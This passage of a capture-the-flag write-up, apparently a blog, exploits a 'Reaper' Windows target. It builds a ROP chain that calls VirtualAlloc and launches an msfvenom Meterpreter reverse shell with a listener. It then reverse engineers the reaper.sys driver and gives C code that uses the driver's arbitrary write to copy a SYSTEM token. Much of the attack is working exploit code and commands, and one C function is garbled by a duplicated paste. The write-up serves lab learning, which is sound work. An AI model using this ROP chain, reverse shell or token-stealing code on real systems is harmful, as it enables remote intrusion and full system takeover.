I could not find a reliable chain/gadget that moved the value `0x1000` in to `r8`, I spent quite some time on this. I found several chains that got me `0x1000` into `r8` but they all had residual consequences that broke the rest of the ROP chain. Eventually I settled on using the value in `r9` and adding it `0x40` times to `r8` (which was set to `0x0`). This gave me the required value in `r8` (`MEM_COMMIT`):

```python
# flAllocationType - r8 
# ---------------------------------------------------------------------------------
for n in range(0, 0x40, 1):
    buffer += pack("<Q", base_address + 0x3918)     # add r8, r9 ; add rax, r8 ; ret ;
```

## VirtualAlloc

Next I stored the address of `VirtualAlloc` in `rax`; it will become clear why when I show how I set the value for `dwSize`. This ROP chain uses a common technique; I popped the IAT address for `VirtualAlloc` into `rax` and then dereferenced the address into `rax`:

```python
# VirtualAlloc call - rax (will jump to rax later)
# ---------------------------------------------------------------------------------
buffer += pack("<Q", base_address + 0x150a)         # pop rax ; ret ;
buffer += pack("<Q", base_address + 0x20000)        # VirtualAlloc IAT address
buffer += pack("<Q", base_address + 0x1547f)        # mov rax, qword [rax] ; add rsp, 0x28 ; 
																										# ret ;
buffer += b"B" * 0x28                               # padding for add rsp, 0x28
# rax contains the address of VirtualAlloc
```

> **NOTE**
>
> Notice the padding that is required as a consequence of the `add rsp, 0x28` instruction.

## dwSize

Looking at the code, it should be clear why this gadget has been left until last. I needed to set `dwSize` to `0x1000` and `r8` already contained this value from the `flAllocationType` parameter. I moved it into `rdx`. The gadget also had a jump to the value in `rax` which is pointing to the `VirtualAlloc` function.

```python
 # dwSize - rdx
 # ---------------------------------------------------------------------------------
 buffer += pack("<Q", base_address + 0x5adb)         # mov rdx, r8 ; jmp rax ;
```

This is a great gadget as we don't need to `push rax` on to the stack, it simply calls the function and when the `ret` is hit at the end of the function our next gadget will be executed.

## Testing

I tested the ROP chain, first I examined the stack before the jump to `VirtualAlloc`:

```
0:003> !address rsp
...
Usage:                  Stack
Base Address:           0000009c`9e5fd000
End Address:            0000009c`9e600000
Region Size:            00000000`00003000 (  12.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        0000009c`9e500000
Allocation Protect:     00000004          PAGE_READWRITE
```

The page protection, as expected, was `PAGE_READWRITE`. I then examined the stack after the `VirtualAlloc` had returned control to my ROP chain:

```
0:003> !address rsp
...
Usage:                  Stack
Base Address:           0000009c`9e5fe000
End Address:            0000009c`9e600000
Region Size:            00000000`00002000 (   8.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000040          PAGE_EXECUTE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        0000009c`9e500000
Allocation Protect:     00000004          PAGE_READWRITE
```

The page protection was now `PAGE_EXECUTE_READWRITE`, meaning all I had to do was get control of `rip` and executed shellcode on the stack.

# Control of RIP

The first thing we need to do when exploiting 64bit x86 architecture is clean up the stack following a Win32 API call. This is straightforward, I added a `add rsp, 0x28` gadget and padded out the buffer. After this I pushed `rsp` on the stack (which pointed to the nops that followed). I no longer cared about the value in `rax` so the residual instruction (`and al, 0x08`) was not a concern:

```python
# Shellcode execution
# ---------------------------------------------------------------------------------
buffer += pack("<Q", base_address + 0x175b)         # add rsp, 0x28 ; ret ;
buffer += b"B" * 0x28                               # padding to control the stack
buffer += pack("<Q", base_address + 0x1becd)        # push rsp ; and al, 0x08 ; ret ;
buffer += b"\x90" * 1000                            # nops
```

If the shellcode gods were watching over me I should have code execution on the stack. I tested the entire rop chain and eventually observed nop execution:

```
0:003> p
ReaperKeyCheck+0x175f:
00007ff6`e5b1175f c3              ret
0:003> p
ReaperKeyCheck+0x1becd:
00007ff6`e5b2becd 54              push    rsp
0:003> p
ReaperKeyCheck+0x1bece:
00007ff6`e5b2bece 2408            and     al,8
0:003> p
ReaperKeyCheck+0x1bed0:
00007ff6`e5b2bed0 c3              ret
0:003> p
00000068`17cfefa8 90              nop
```

As the Scottish might say: "Fan' Dabi' Dozi"!

# Shellcode

I tested a reverse shell locally to make sure my exploit worked:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.245.148 LPORT=4444 -f python -v shellcode
```

I used **msfvenom** to generate the shellcode and **msfconsole** as the listener:

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set lhost 172.16.245.148
lhost => 172.16.245.148
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.245.148:4444 
[*] Sending stage (200774 bytes) to 172.16.245.149
[*] Meterpreter session 2 opened (172.16.245.148:4444 -> 172.16.245.149:54277) at 2024-06-30 15:11:01 +0100
```

> [!WARNING]
>
> I had to disabled Windows Defender in order to get my meterpreter shell working. At this point I hadn't tested it against the Reaper target, which may or may not be running an anti-malware product.

# Initial Access

I ran the final exploit against the target host:

```
python3 ./final.py 10.10.85.107 
REAPER PoC
----------
[*] Connecting to: 10.10.85.107
[*] Leaked address: 0x7ff65e5a0660
[*] Module base address: 0x7ff65e580000
[*] Sending the exploit...
```

I got a nice reverse meterpreter shell:

```
msf6 > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 > set lport 4444
lport => 4444
msf6 > set lhost 10.8.2.195
lhost => 10.8.2.195
msf6 > use multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.2.195:4444 
[*] Sending stage (200774 bytes) to 10.10.85.107
[*] Meterpreter session 1 opened (10.8.2.195:4444 -> 10.10.85.107:49747) at 2024-06-30 15:45:28 +0100
```

## User Flag

I found the flag in the root of the **C** drive:

```
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AAB6-57D4

 Directory of C:\

07/27/2023  09:37 AM    <DIR>          driver
08/15/2023  12:14 AM    <DIR>          ftp
07/25/2023  05:33 AM    <DIR>          inetpub
08/15/2023  12:09 AM    <DIR>          keysvc
12/07/2019  02:14 AM    <DIR>          PerfLogs
07/27/2023  10:43 AM    <DIR>          Program Files
07/25/2023  05:33 AM    <DIR>          Program Files (x86)
07/25/2023  05:50 AM                36 user.txt
07/25/2023  05:29 AM    <DIR>          Users
06/30/2024  07:45 AM    <DIR>          Windows
               1 File(s)             36 bytes
               9 Dir(s)   1,626,509,312 bytes free
```

I submit the flag to discord:

<img width="1347" alt="image" src="https://github.com/user-attachments/assets/6d9b8994-80d0-4efa-8314-36da1e23bfc5">

# Privilege Escalation

## Custom Driver

There was a driver in the `C:\driver\` folder called `reaper.sys`, this is a custom driver based upon the name of the file. This might be running on the system (and will have kernel level privileges):

```
C:\driver>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AAB6-57D4

 Directory of C:\driver

07/27/2023  09:37 AM    <DIR>          .
07/27/2023  09:37 AM    <DIR>          ..
07/27/2023  09:12 AM             8,432 reaper.sys
               1 File(s)          8,432 bytes
               2 Dir(s)   1,919,651,840 bytes free
```

I checked to see if the driver was running, and it was:

```
C:\driver>driverquery /v | findstr reaper
reaper       reaper                 reaper                 Kernel        Auto       Running    OK         TRUE        FALSE        0                 4,096       0          7/27/2023 9:12:21 AM   \??\C:\driver\reaper.sys                         4,096
```

I checked the version of Windows using the **systeminfo** command, if the driver was vulnerable I may have needed to understand what Kernel level mitigations were deployed:

```
systeminfo

Host Name:                 REAPER
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
```

## Symlink, Dispatch Routine and IOCTL numbers

To analyse a driver I first needed to find the following:

- **Symlink**: The ID used to communicate with the driver from user mode.
- **Dispatch Routine**: to analyse code flow, find IOCTLs and hunt for vunerabilities.
- **IOCTL numbers**: to interact with the driver when I had found a vulnerability.

I downloaded the driver binary file and loaded it in to IDA for analysis, I located the `DriverEntry` function and looked for a function that called `IoCreateDevice`.

> **NOTE**
>
> The `IoCreateDevice` routine creates a device object for use by a driver.

I found a function call, which I renamed to `Setup_Driver`. Within this function I found a fcall to `IOCreateDevice` at the offset of `0x1281`:

```
.text:0000000000001229 lea     rax, sub_1000
.text:0000000000001230 mov     [rsp+1A0h+var_160], 1E001Ch
.text:0000000000001238 mov     [rbx+70h], rax
.text:000000000000123C lea     r8, [rsp+1A0h+var_160]
.text:0000000000001241 mov     [rbx+80h], rax
.text:0000000000001248 mov     r9d, 22h ; '"'
.text:000000000000124E lea     rax, Dispatch_Routine
.text:0000000000001255 xor     edx, edx
.text:0000000000001257 mov     [rbx+0E0h], rax
.text:000000000000125E mov     rcx, rbx
.text:0000000000001261 lea     rax, aDeviceReaper ; "\\Device\\Reaper"
.text:0000000000001268 mov     [rsp+1A0h+var_158], rax
.text:000000000000126D lea     rax, [rsp+1A0h+var_150]
.text:0000000000001272 mov     [rsp+1A0h+var_170], rax
.text:0000000000001277 mov     [rsp+1A0h+var_178], 0
.text:000000000000127C and     [rsp+1A0h+var_180], 0
.text:0000000000001281 call    cs:IoCreateDevice
```

I renamed the function whose address was loaded in to `rax` using the `lea` instruction at offset `0x124e`. I renamed this function to `Dispatch_Routine`. I also noted the driver symlink: `\\Device\\Reaper`.

Without analysing this too much, instinct told me that I had located the dispatch function. This was based on the following information. When writing driver code generally a dispatch function would be configured as such:

```c
DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Dispatch_Routine;
```

This driver object would be passed to `IoCreateDevice` as the seventh parameter:

```c
NTSTATUS IoCreateDevice(
  [in]           PDRIVER_OBJECT  DriverObject,
  [in]           ULONG           DeviceExtensionSize,
  [in, optional] PUNICODE_STRING DeviceName,
  [in]           DEVICE_TYPE     DeviceType,
  [in]           ULONG           DeviceCharacteristics,
  [in]           BOOLEAN         Exclusive,
  [out]          PDEVICE_OBJECT  *DeviceObject
);
```

This was confirmed when I analysed the `Dispatch_Routine` function, which contained the following instructions:

```
.text:0000000000001039                 mov     ebx, 0C0000010h
.text:000000000000103E                 mov     eax, [rcx+18h]
.text:0000000000001041                 cmp     eax, 80002003h
.text:0000000000001046                 jz      loc_10E0
.text:000000000000104C                 cmp     eax, 80002007h
.text:0000000000001051                 jz      short loc_10C9
.text:0000000000001053                 cmp     eax, 8000200Bh
.text:0000000000001058                 jnz     loc_1165
```

These conditional branches look like three different IOCTL numbers are being compared:

``` 
0x80002003
0x80002007
0x8000200b
```

> **NOTE**
>
> I/O control codes (IOCTLs) are used for communication between user-mode applications and drivers, or for communication internally among drivers in a stack.

## IOCTL Code Flow

Using **IDA** I mapped out the code flows of each IOCTL:

![image](https://github.com/user-attachments/assets/9084973c-ca9a-4968-9833-ad5b90e3fc1a)

The flow for each IOCTL makes the following Kernel function calls:

```
0x80002003 -> ExAllocatePoolWithTag
0x80002007 -> ExFreePoolWithTag
0x8000200b -> PsLookupThreadByThreadId -> KeSetPriorityThread -> ObfDereferenceObject
```

### 0x80002003

The `ExAllocatePoolWithTag` routine allocates pool memory of the specified type and returns a pointer to the allocated block. This indicated that I might be able to allocate some memory in Kernel space.

The syntax for this call is:

```c
PVOID ExAllocatePoolWithTag(
  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
  [in] SIZE_T                                         NumberOfBytes,
  [in] ULONG                                          Tag
);
```

Upon analysing the code it looked like the call was:

```c
PVOID pAddress = ExAllocatePoolWithTag(NonPagedPool, 0x20, 0x70616552);
```

> **NOTE**
>
> System memory allocated with the **NonPagedPool** pool type is executable.

### 0x80002007

The `ExFreePoolWithTag` routine deallocates a block of pool memory allocated with the specified tag. This indicated I could free the memory that I had allocated previously.

The syntax for this call is:

```c
void ExFreePoolWithTag(
  [in] PVOID P,
  [in] ULONG Tag
);
```

Upon analysing the code it looked like the call was:

```c
ExFreePoolWithTag(pAddress, 0x70616552);
```

So far I had found two IOCTLs; one that allocated executable memory and one that freed that memory.

### 0x8000200b

The `PsLookupThreadByThreadId` routine accepts the thread ID of a thread and returns a referenced pointer to the ETHREAD structure of the thread.

The syntax for this call is:

```c
NTSTATUS PsLookupThreadByThreadId(
  [in]  HANDLE   ThreadId,
  [out] PETHREAD *Thread
);
```

The `KeSetPriorityThread` routine sets the run-time priority of a driver-created thread.

The syntax for this call is:

```c
KPRIORITY KeSetPriorityThread(
  [in, out] PKTHREAD  Thread,
  [in]      KPRIORITY Priority
);
```

The `ObfDereferenceObject` routine decrements the reference count to the given object.

The syntax for this call is:

```c
void ObDereferenceObject(
  [in]  a
);
```

## Decompiled Function

Using **IDA Free** I decompiled the `Dispatch_Routine` function. Using a mixture of Kernel debugging and static analysis I attempted to work out what each of the variables and structures were. This is a long process and takes a lot of time:

```c
__int64 __fastcall Dispatch_Routine(__int64 pDeviceObject, _IRP *pIrp)
{
  __int64 Parameters; // rcx
  signed int status; // ebx
  int IOCTL; // eax
  _QWORD *pDestinationAddress; // rcx
  _QWORD *pSourceAddress; // rax
  __int64 userData; // rsi
  struct_globalInput *PoolWithTag; // rax
  __int64 PETHREAD; // [rsp+38h] [rbp+10h] BYREF

  Parameters = pIrp->NotSure2;
  status = 0xC0000010;
  IOCTL = *(_DWORD *)(Parameters + 24);
  if ( IOCTL != 0x80002003 )
  {
    if ( IOCTL != 0x80002007 )
    {
      if ( IOCTL == 0x8000200B )
      {
        status = PsLookupThreadByThreadId(globalInput->ThreadId, &PETHREAD);
        if ( status >= 0 )
        {
          KeSetPriorityThread(PETHREAD, globalInput->ThreadPriority);
          ObfDereferenceObject(PETHREAD);
          pDestinationAddress = globalInput->pDestinationAddress;
          if ( pDestinationAddress )
          {
            pSourceAddress = globalInput->pSourceAddress;
            if ( pSourceAddress )
              *pDestinationAddress = *pSourceAddress;
          }
        }
      }
      goto END_LABEL;
    }
    ExFreePoolWithTag(globalInput, 'paeR');
PRE_END_LABEL:
    status = 0;
    goto END_LABEL;
  }
  userData = *(_QWORD *)(Parameters + 32);
  status = userData != 0 ? 0xC0000010 : 0xC000000D;
  if ( *(_DWORD *)(Parameters + 16) < 0x20u )
    status = -1073741789;
  if ( *(_DWORD *)userData == 0x6A55CC9E )
  {
    PoolWithTag = (struct_globalInput *)ExAllocatePoolWithTag(NonPagedPool, 0x20LL, 'paeR');
    globalInput = PoolWithTag;
    if ( PoolWithTag )
    {
      *(_DWORD *)PoolWithTag->padding_4_bytes = *(_DWORD *)userData;
      globalInput->ThreadPriority = *(_DWORD *)(userData + 8);
      globalInput->ThreadId = *(_DWORD *)(userData + 4);
      globalInput->pSourceAddress = *(_QWORD **)(userData + 16);
      globalInput->pDestinationAddress = *(_QWORD **)(userData + 24);
      goto PRE_END_LABEL;
    }
  }
END_LABEL:
  pIrp->NotSure = 0LL;
  pIrp->Status = status;
  IofCompleteRequest(pIrp, 0LL);
  return (unsigned int)status;
}
```

The parts that stood out were the lines from `27-32`, this was inside the IOCTL `0x8000200b`; it was now clear that this was a copy operation:

```c
if ( pDestinationAddress )
{
	pSourceAddress = globalInput->pSourceAddress;
  if ( pSourceAddress )
    *pDestinationAddress = *pSourceAddress;
}
```

This gave me an arbitrary write primitive. The lines from `52-56` indicated we could control this arbitrary write primitive, using the IOCTL `0x80002003`:

```c
*(_DWORD *)PoolWithTag->padding_4_bytes = *(_DWORD *)userData;
globalInput->ThreadPriority = *(_DWORD *)(userData + 8);
globalInput->ThreadId = *(_DWORD *)(userData + 4);
globalInput->pSourceAddress = *(_QWORD **)(userData + 16);
globalInput->pDestinationAddress = *(_QWORD **)(userData + 24);
```

There is also a 'magic' value check in the code on line `46`:

```c
if ( *(_DWORD *)userData == 0x6A55CC9E )
```

My plan was to:

- Allocate Pool memory using IOCTL `0x80002003`, whilst assigning the structure.
- Carry out an arbitrary write, using IOCTL `0x80002007b`. I would copy the Security Token from a privileged process to my current process.
- Free the allocated memory using IOCTL `0x80002007`.

# Kernel Debugging

I decided to use network debugging to debug the kernel. To do this I need to issue the following commands on the newly installed debugee:

```
bcdedit /copy {current} /d "Network Debugging"
bcdedit /debug {GUID returned from previous command} on
bcdedit /dbgsettings net hostip:1.1.1.1 port:50000
```

A key was generated for the debugging sessions. I could now connect to the debugee using **Windbg Preview**.

I registered, and started the driver on my debugee:

```
bcdedit /set testsigning on
The operation completed successfully.

sc create Reaper binPath= C:\Users\John\Desktop\reaper.sys type= kernel
[SC] CreateService SUCCESS

sc start Reaper
SERVICE_NAME: Reaper
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :
```

I checked in **Windbg** that the driver was now loaded in to kernel space:

```
lm l
start             end                 module name
...            
fffff800`74290000 fffff800`74297000   reaper     (deferred)
...
```

And here is the dispatch routine I was reverse engineering:

```
!drvobj \Driver\Reaper 2
Driver object (ffffe384deeb8850) is for:
 \Driver\Reaper

DriverEntry:   fffff80074295000	reaper
DriverStartIo: 00000000	
DriverUnload:  fffff80074291190	reaper
AddDevice:     00000000	

Dispatch routines:
...
[0e] IRP_MJ_DEVICE_CONTROL              fffff80074291020	reaper+0x1020
```

I started writing an exploit. I've written some basic kernel exploits based on `HEVD` but nothing too complicated. This is how I started out:

```c
int main()
{
    HANDLE hDevice = CreateFileA(REAPER_SYM_LINK, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

    // if CreateFileA fails the handle will be -0x1
    if (hDevice == (HANDLE)-0x1)
    {
        // could not get a handle to the driver
        printf("[+] Driver handle: 0x%p\n", hDevice);
        printf("[!] Unable to get a handle to the driver.\n");
        return 1;
    }
    else
    {
        // create the input data for the write
        ReaperData userData;

        userData.Magic = 0x6a55cc9e;
        userData.ThreadId = GetCurrentThreadId();
        userData.Priority = 0;
        userData.SrcAddress = NULL;
        userData.DstAddress = NULL;
```

And then it suddenly dawned on me... I wanted to copy a `SYSTEM` token to the current process thread. I have done this using 64bit shellcode before. In my head I was like **"I'll run the token stealing shellcode then I'm done"**... wait... I don't have code execution in the kernel, I have an arbitrary read/write!

I thought that using my arbitrary read I might be able to convert the token stealing shellcode in to user mode code, using kernel reads, to enumerate a system process, locate the security token, then locate the current process in kernel mode and copy the token over using the arbitrary write. Sounds simple, just one catch. I had never done this before!

# Token Stealing

Token stealing is a technique used in Windows privilege escalation. Each running process has an associated `_EPROCESS` object in the kernel, and the `_EPROCESS` onject contains a reference to the `_EX_FAST_REF` structure; this represents the process' security token.

Token stealing involves exploiting kernel code to copy the `SYSTEM` token into the current process token, thus elevating privileges.

I formulated a plan:

- Locate the base address of the kernel.
- Locate the `SYSTEM` `_EPROCESS` using a common technique from user mode.
- Locate the `SYSTEM` token using the read/write primitive in the vulnerable driver.
- Enumerate the running processes using the read/write primitive.
- Locate the current process and locate the associated security token address.
- Use the read/write primitive to copy the `SYSTEM` token over the current process' token.

## Read/Write Primitive

This code uses the vulnerability I found in the **reaper** driver to read and write to any kernel mode address. This was used in other functions:

```c
void ArbitraryWrite(HANDLE hDevice, QWORD src, QWORD dst)
{
    ReaperData userData;

    userData.Magic = 0x6a55cc9e;
    userData.ThreadId = GetCurrentThreadId();
    userData.Priority = 0;
    userData.SrcAddress = src;
    userData.DstAddress = dst;

    // Allocate pool memory
    unsigned char outputBuf[1024];
    memset(outputBuf, 0, sizeof(outputBuf));
    ULONG bytesRtn;

    BOOL result = DeviceIoControl(hDevice,
        IOCTL_ALLOCATE,
        (LPVOID)&userData,
        (DWORD)sizeof(struct ReaperData),
        outputBuf,
        1024,
        &bytesRtn,
        NULL);

    // Copy operation
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice,
        IOCTL_COPY,
        (LPVOID)NULL,
        (DWORD)0,
        outputBuf,
        1024,
        &bytesRtn,
        NULL);

    // Free pool memory
    memset(outputBuf, 0, sizeof(outputBuf));
    result = DeviceIoControl(hDevice,
        IOCTL_FREE,
        (LPVOID)NULL,
        (DWORD)0,
        outputBuf,
        1024,
        &bytesRtn,
        NULL);
}

void ArbitraryRead(HANDLE hDevice, QWORD src, QWORD dst)
{
    return ArbitraryWrite(hDevice, src, dst);
}
```

## Kernel Base Address

Locating the kernel base address was fairly straightforward. I used a common technique that I have used before:

```c
QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
    
    return (QWORD)drivers[0];
}
```

I used the `EnumDeviceDrivers` Win32 API. This function populates an array with the kernel address of each driver, luckily the first entry is the base address of the kernel. Easy!

## SYSTEM Security Token

After doing a bit of research I wrote the following code:

```c
QWORD GetSystemTokenAddress(QWORD kernelBase, HANDLE hDevice)
{
    // Load kernel in to user land and get the PsInitialSystemProcess address
    HMODULE hKernel = LoadLibraryA(NTOSKRNL_EXE);
    HANDLE psInitialProcess = GetProcAddress(hKernel, "PsInitialSystemProcess");

    QWORD psOffset = (QWORD)psInitialProcess - (QWORD)hKernel;
    QWORD psAddress = (QWORD)kernelBase + (QWORD)psOffset;

    QWORD dereferencedSystemEprocessAddress;
    ArbitraryRead(hDevice, psAddress, (QWORD)&dereferencedSystemEprocessAddress);
    printf("[+] SYSTEM _EPROCESS address: 0x%p\n", dereferencedSystemEprocessAddress);

    QWORD systemTokenAddress = dereferencedSystemEprocessAddress + TOKEN_OFFSET;
    FreeLibrary(hKernel);

    return systemTokenAddress;QWORD GetSystemTokenAddress(QWORD kernelBase, HANDLE hDevice)
{
    // Load kernel in to user land and get the PsInitialSystemProcess address
    HMODULE hKernel = LoadLibraryA(NTOSKRNL_EXE);
    HANDLE psInitialProcess = GetProcAddress(hKernel, "PsInitialSystemProcess");

    QWORD psOffset = (QWORD)psInitialProcess - (QWORD)hKernel;
    QWORD psAddress = (QWORD)kernelBase + (QWORD)psOffset;

    QWORD dereferencedSystemEprocessAddress;
    ArbitraryRead(hDevice, psAddress, (QWORD)&dereferencedSystemEprocessAddress);
    printf("[+] SYSTEM _EPROCESS address: 0x%p\n", dereferencedSystemEprocessAddress);

    QWORD systemTokenAddress = dereferencedSystemEprocessAddress + TOKEN_OFFSET;
    FreeLibrary(hKernel);

    return systemTokenAddress;
    }
}
```

I loaded the kernel image on line `4` and located the address of `PsInitialSystemProcess`. I was able to take this address and work out the offset based upon the address that the module was loaded at (lines `7-8`).

I then used the arbitrary read primitive to get the actual address of the `SYSTEM` `_EPROCESS` by dereferencing the `PsInitialSystemProcess` address. I learned this new technique during my research (lines `10-12`).

I used a token offset for the target operating system to locate the address of the `SYSTEM` token on line `14`.

> **TIP**
>
> The `_EPROCESS` structure can be examined using the `dt nt!_EPROCESS <address>` command in **WinDbg** to find the offset of various fields, including the security token.

## Current Security Token

The `_EPROCESS` structure contains a field called `ActiveProcessLinks`; this is a doubly linked list to all the processes running (their `_EPROCESS` objects that is):

```c
QWORD GetCurrentTokenAddress(QWORD SystemProcessAddress, HANDLE hDevice)
{
    QWORD processAddress = SystemProcessAddress;
    QWORD processLinkAddress;
    QWORD processId;
    DWORD currentProcessId = GetCurrentProcessId();

    while(TRUE)
    {
        ArbitraryRead(hDevice, processAddress + ACTIVE_PROCESS_LINKS_OFFSET, (QWORD)&processLinkAddress);

        ArbitraryRead(hDevice, processLinkAddress - ACTIVE_PROCESS_LINKS_OFFSET + UNIQUE_PROCESS_ID_OFFSET, (QWORD)&processId);

        processAddress = processLinkAddress - ACTIVE_PROCESS_LINKS_OFFSET;

        if ((DWORD)processId == currentProcessId)
        {
            break;
        }
    }

    printf("[+] Current _EPROCESS address: 0x%p\n", processAddress);
    return processAddress + TOKEN_OFFSET;
}
```

This code is self explanatory. It enumerates processes until it finds one with a `UniqueProcessId` that matches the one returned from `GetCurrentProcessId`. One the process is found the address of the `_EX_FAST_REF` (Token offset) is returned.

## Putting it Together

The main code pieces all of this together in to a privilege escalation exploit:

```c
// get the kernel base address
QWORD kernelBase = GetKernelBase();

// get the system token address
QWORD systemTokenAddress = GetSystemTokenAddress(kernelBase, hDevice);

// get the current process address
QWORD currentTokenAddress = GetCurrentTokenAddress(systemTokenAddress - TOKEN_OFFSET, hDevice);

QWORD systemTokenDereferenced;
ArbitraryWrite(hDevice, (QWORD)systemTokenAddress, (QWORD)&systemTokenDereferenced);

// do the system token write
ArbitraryWrite(hDevice, (QWORD)&systemTokenDereferenced, (QWORD)currentTokenAddress);

// spawn a new command prompt
system("cmd.exe");
```

The complete privilege escalation code can be found at the following link:

[Plackyhacker]: https://github.com/plackyhacker/misc-scripts/blob/main/awe-prep/reaper-priv-esc.c	"Reaper Driver Priv Esc Code"

# Testing the Exploit

I tested the exploit code on my local lab:

```
Reaper Priv Esc Driver Exploit
------------------------------
[+] Driver handle: 0x00000000000000A0
[+] Kernel base address: 0xFFFFF8041F000000
[+] SYSTEM _EPROCESS address: 0xFFFFD10C45860040
[+] SYSTEM token address: 0xFFFFD10C458604F8
[+] Current _EPROCESS address: 0xFFFFD10C4E846080
[+] Current token address: 0xFFFFD10C4E846538
[+] System token dereferenced: 0xFFFF9F87D989C72E
[+] Copying SYSTEM token...
[+] Spawning new process...

Microsoft Windows [Version 10.0.19045.4529]
(c) Microsoft Corporation. All rights reserved.

C:\Users\John\source\repos\ReaperPrivEsc\ReaperPrivEsc>whoami
nt authority\system
```

Rock on! I had successfully exploited the **reaper** driver. It was now time to check the target operating system version and make tweaks to the structure offsets:

```
Host Name:                 REAPER
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
```

This version is Windows 10 22H2. I used the Vergilius Project to examine the `_EPROCESS` structure.

[Vergilius Project]: https://www.vergiliusproject.com/kernels/x64/windows-10/22h2	"22H2 (2022 Update, Vibranium R5)"

Luckily the offsets were the same on the target as they were for my lab:

```c
#define UNIQUE_PROCESS_ID_OFFSET 0x440
#define ACTIVE_PROCESS_LINKS_OFFSET 0x448
#define TOKEN_OFFSET 0x4b8
```

# End Game

I uploaded the privilege escalation binary, using a meterpreter shell and ran it in a command prompt:

```
C:\Users\keysvc>ReaperPrivEsc.exe
ReaperPrivEsc.exe
Microsoft Windows [Version 10.0.19045.3208]
(c) Microsoft Corporation. All rights reserved.

C:\Users\keysvc>whoami
whoami
nt authority\system

C:\Users\keysvc>hostname
hostname
reaper
```

I grabbed the **root.txt** file and submit it to discord:

<img width="921" alt="image" src="https://github.com/user-attachments/assets/470ad8f1-6fad-4587-814c-8c644778093c">

[Home](https://plackyhacker.github.io)
